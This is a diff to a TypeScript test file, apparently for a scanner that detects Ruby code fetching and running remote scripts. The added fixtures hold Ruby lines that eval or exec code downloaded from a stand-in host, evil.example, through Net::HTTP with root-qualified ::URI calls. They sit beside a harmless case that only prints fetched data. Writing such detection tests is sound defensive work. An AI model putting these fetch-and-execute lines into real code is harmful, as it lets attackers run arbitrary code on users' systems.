@@ -53,6 +53,23 @@ const FETCHED_CODE: Record<string, [string, string]> = {
     "tools/setup.rb",
     "require 'net/http'\neval(Net::HTTP.get(URI.parse('https://evil.example/x.rb')))\n",
   ],
+  "ruby eval of Net::HTTP.get with root-qualified ::URI.parse in Ruby source": [
+    "tools/setup.rb",
+    "require 'net/http'\neval(Net::HTTP.get(::URI.parse('https://evil.example/x.rb')))\n",
+  ],
+  "ruby eval of Net::HTTP.get with root-qualified ::URI in Ruby source": [
+    "tools/setup.rb",
+    "require 'net/http'\neval(Net::HTTP.get(::URI('https://evil.example/x.rb')))\n",
+  ],
+  "ruby eval of Net::HTTP.get_response with root-qualified ::URI.parse in Ruby source":
+    [
+      "tools/setup.rb",
+      "require 'net/http'\neval(Net::HTTP.get_response(::URI.parse('https://evil.example/x.rb')).body)\n",
+    ],
+  "ruby exec of Net::HTTP.get with root-qualified ::URI.parse in Ruby source": [
+    "tools/setup.rb",
+    "require 'net/http'\nexec(Net::HTTP.get(::URI.parse('https://evil.example/x.rb')))\n",
+  ],
   "ruby eval of URI.open in Ruby source": [
     "tools/setup.rb",
     "require 'open-uri'\neval(URI.open('https://evil.example/x.rb').read)\n",
@@ -122,6 +139,10 @@ test("fetching data without executing it keeps no finding", () => {
     [
       "tools/fetch.rb",
       "require 'net/http'\nputs Net::HTTP.get(URI.parse('https://example.com/data.json'))\n",
+    ],
+    [
+      "tools/fetch.rb",
+      "require 'net/http'\nputs Net::HTTP.get(::URI.parse('https://example.com/data.json'))\n",
     ],
   ] as const) {
     expect({ path, findings: categories(inspected(path, body)) }).toEqual({
